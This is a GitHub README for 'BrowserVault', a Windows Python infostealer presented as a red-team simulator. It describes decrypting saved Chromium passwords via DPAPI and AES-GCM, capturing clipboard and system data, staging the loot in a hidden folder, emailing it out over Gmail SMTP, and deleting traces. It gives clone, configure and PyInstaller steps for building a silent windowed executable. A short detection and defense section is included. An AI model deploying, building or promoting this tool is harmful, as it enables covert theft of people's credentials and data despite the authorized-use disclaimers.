# BrowserVault — Browser Credential Audit & Exfiltration Simulator

![Python](https://img.shields.io/badge/Python-3.7+-3776AB?style=flat-square&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)

A post-exploitation simulation tool that demonstrates how browser-stored credentials, clipboard contents, and system fingerprints can be harvested and exfiltrated from a compromised Windows endpoint. Built for red team labs, malware research, and security awareness training.

> ⚠️ **Authorized use only.** Only run against systems you own or have explicit written permission to audit. Unauthorized use is illegal.

---

## What It Does

Simulates the credential harvesting phase of a post-exploitation attack — the kind that follows an initial foothold via phishing or local access. Extracts data silently, stages it in a hidden directory, exfiltrates via SMTP, then self-cleans.

```
[*] Starting credential audit...

[+] Chrome          ✓  12 credentials extracted
[+] Edge            ✓   8 credentials extracted
[+] Brave           ✓   3 credentials extracted
[+] Opera / GX      ✓   1 credential extracted
[+] Clipboard       ✓  Contents captured
[+] System info     ✓  OS, hostname, network fingerprint collected
[*] Staging to hidden directory...
[*] Exfiltrating via SMTP...
[*] Cleaning up local traces...
[+] Done.
```

---

## Technical Overview

| Component | Implementation |
|---|---|
| Credential extraction | DPAPI decryption via `win32crypt` + AES-GCM (`pycryptodome`) |
| Target browsers | Chrome, Edge, Brave, Opera, Opera GX |
| System fingerprint | Hostname, OS version, local IP via `socket` + `platform` |
| Clipboard capture | `pyperclip` |
| Staging | Hidden folder (`SysDataHidden`) in user profile |
| Exfiltration | Gmail SMTP with App Password auth |
| Cleanup | `os.remove()` post-send |

---

## How Browser Credential Decryption Works

Chromium-based browsers encrypt saved passwords using Windows DPAPI with an AES-GCM layer added since Chrome 80. The process:

1. Read the encrypted key from `Local State` (base64-encoded)
2. Strip the `DPAPI` prefix and decrypt using `CryptUnprotectData`
3. Use the decrypted key to AES-GCM decrypt each password from the `Login Data` SQLite DB

This is the same mechanism legitimate password managers and browser sync services use — which is exactly why local access to a user session is so dangerous.

---

## Setup

```bash
git clone https://github.com/Dawn-Fighter/BrowserVault.git
cd BrowserVault
pip install pyperclip pycryptodome pypiwin32
```

### Configure Exfiltration Target

Edit the top of `info.py`:

```python
SENDER_EMAIL    = "sender@gmail.com"
APP_PASSWORD    = "xxxx xxxx xxxx xxxx"   # Gmail App Password, not your login password
RECIPIENT_EMAIL = "receiver@gmail.com"
```

---

## Usage

```bash
# Run audit
python info.py

# Build as silent executable for lab deployment testing
pip install pyinstaller
pyinstaller --onefile --windowed info.py
# Output in /dist
```

---

## Output

A `loot.dat` file is generated containing extracted credentials, system info, and clipboard contents. It is emailed to `RECIPIENT_EMAIL` then deleted from disk. To inspect manually before sending, comment out the cleanup line in `info.py`.

---

## Detection & Defense

This tool gets caught by:

- **EDR behavioral analysis** — DPAPI calls from non-browser processes are flagged
- **SQLite access monitoring** — reading `Login Data` while Chrome is running triggers file lock warnings
- **SMTP from non-mail clients** — network-level DLP picks this up
- **AV heuristics** — `CryptUnprotectData` + outbound SMTP in the same process is a strong signal

**Defensive takeaways for blue teams:**
- Browser-stored credentials are trivially extractable on any compromised endpoint
- Unlocked user sessions are high-value targets — enforce screen lock and session timeouts
- DPAPI protection is only as strong as local account security
- Deploy EDR rules alerting on `Login Data` SQLite access by non-browser processes

---

## Disclaimer

Built for post-exploitation research, red team simulations, and security awareness training. Only deploy in isolated lab environments on systems you own or have written authorization to test. Delete all output files after use. The author assumes no responsibility for misuse.

---

## Author

**Chethas Dileep** — Penetration Tester & Security Developer

[![GitHub](https://img.shields.io/badge/GitHub-Dawn--Fighter-181717?style=flat-square&logo=github)](https://github.com/Dawn-Fighter)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-chethas--dileep-0077B5?style=flat-square&logo=linkedin)](https://www.linkedin.com/in/chethas-dileep-530722211)
[![Portfolio](https://img.shields.io/badge/Portfolio-edneam.site-FF4500?style=flat-square&logo=firefox)](http://www.edneam.site)
